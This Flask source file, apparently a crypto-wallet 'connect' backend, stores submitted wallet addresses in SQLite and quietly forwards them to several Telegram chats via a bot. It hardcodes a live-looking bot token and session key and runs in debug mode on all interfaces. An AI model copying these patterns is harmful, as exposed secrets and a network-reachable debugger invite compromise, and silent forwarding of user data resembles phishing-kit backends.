from flask import Flask, render_template, request, jsonify, session
import sqlite3
import os
import requests
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = 'ThisIsSecretSecretSecretLife'  # Ключ для шифрування сесій

# Конфігурація Telegram
TELEGRAM_BOT_TOKEN = '7772156705:AAFmu7cRnywWvj2ZyYNjendPF-jDwRLaxQk'
TELEGRAM_CHAT_IDS = ["982150223", "8186192263", "282916420"]


def init_db():
    with sqlite3.connect("database.db") as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS wallets (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        wallet_address TEXT NOT NULL,
                        wallet_type TEXT NOT NULL)''')


init_db()


def send_telegram_notification(wallet_address, wallet_type):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_IDS:
        app.logger.error("Telegram bot token or chat IDs are missing.")


    message = (
        "🛡️ *Нове підключення гаманця!*\n\n"
        f"💼 *Тип гаманця:* `{wallet_type}`\n"
        f"📭 *Адреса:* `{wallet_address}`"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    for chat_id in TELEGRAM_CHAT_IDS:
        if not chat_id.strip():
            continue
        payload = {
            "chat_id": chat_id.strip(),
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            response = requests.post(url, json=payload)
            response.raise_for_status()
            app.logger.info(f"Message sent successfully to {chat_id}: {response.json()}")
        except requests.exceptions.RequestException as e:
            app.logger.error(f"Telegram send error for {chat_id}: {e}")


@app.route('/')
def home():
    session['user'] = os.urandom(16).hex()  # Генеруємо унікальний ID для кожного клієнта
    return render_template('index.html')


@app.route('/connect_wallet', methods=['POST'])
def connect_wallet():
    data = request.json
    wallet_address = data.get('wallet_address')
    wallet_type = data.get('wallet_type')

    if not wallet_address or not wallet_type:
        return jsonify({"status": "error", "message": "Invalid data"}), 400

    try:
        with sqlite3.connect("database.db") as conn:
            conn.execute("INSERT INTO wallets (wallet_address, wallet_type) VALUES (?, ?)",
                         (wallet_address, wallet_type))
            conn.commit()

        # Збереження в сесії
        session['wallet_address'] = wallet_address
        session['wallet_type'] = wallet_type

        # Відправка в Telegram
        send_telegram_notification(wallet_address, wallet_type)

        return jsonify({"status": "success", "message": "Wallet connected!"})
    except Exception as e:
        app.logger.error(f"Database error: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)